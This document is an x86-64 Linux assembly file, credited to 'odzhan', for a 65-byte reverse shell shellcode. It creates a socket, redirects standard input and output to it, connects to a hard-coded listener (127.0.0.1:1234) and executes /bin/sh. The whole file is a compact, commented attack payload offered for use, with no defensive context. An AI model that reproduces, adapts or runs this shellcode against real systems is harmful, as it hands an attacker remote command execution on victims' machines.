

; 65 byte reverse shell for linux/x64
; odzhan

    bits 64
    
start64:
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    41
    pop     rax
    push    1
    pop     rsi
    push    2
    pop     rdi
    cdq
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    xchg    eax, esi         ; esi=2
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2(sockfd, fileno);
dup_loop64:
    mov     al, 33           ; rax=sys_dup2
    syscall
    dec     esi
    jns     dup_loop64       ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (sockfd, {AF_INET,1234,127.0.0.1}, 16);
    mov     rcx, ~0x100007fd2040002
    not     ecx
    push    rcx
    push    rsp
    pop     rsi
    mov     dl, 16           ; rdx=sizeof(sa)
    mov     al, 42           ; rax=sys_connect
    syscall    
    
    ; step 4, execute /bin/sh
    ; execv("/bin//sh", 0, 0);
    cdq                      ; rdx=0
    push    rdx
    pop     rsi              ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, 0x68732f2f6e69622f ; "/bin//sh"
    push    rcx
    push    rsp
    pop     rdi
    mov     al, 59           ; rax=sys_execve
    syscall
    
    
